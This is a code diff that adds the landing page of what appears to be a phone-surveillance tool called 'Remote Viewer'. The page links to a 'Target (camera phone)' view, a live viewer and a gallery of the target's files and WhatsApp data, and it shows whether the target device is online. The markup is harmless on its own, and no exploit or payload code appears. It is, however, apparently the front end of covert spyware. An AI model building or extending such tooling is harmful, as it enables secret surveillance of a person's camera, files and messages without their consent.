@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Remote Viewer</title>
+<style>body{background:#111;color:#eee;font-family:sans-serif;padding:20px;text-align:center}a{display:block;margin:10px auto;padding:16px;background:#22c55e;color:#fff;text-decoration:none;border-radius:10px;max-width:320px;font-size:16px}span{color:#9a9;font-size:13px}</style>
+</head>
+<body>
+<h2>🎥 Remote Viewer</h2>
+<span id="st">Status check ho rahi hai...</span>
+<a href="/target.html">📷 Target (camera phone)</a>
+<a href="/view.html">👀 Viewer (dekhne wala)</a>
+<a href="/gallery.html">📁 Gallery (files + WhatsApp)</a>
+<script>
+fetch('/api/status').then(r=>r.json()).then(d=>{
+  document.getElementById('st').textContent='Target: '+(d.target?'ONLINE':'OFFLINE')+' | Viewers: '+d.viewers;
+}).catch(()=>{});
+</script>
+</body>
+</html>
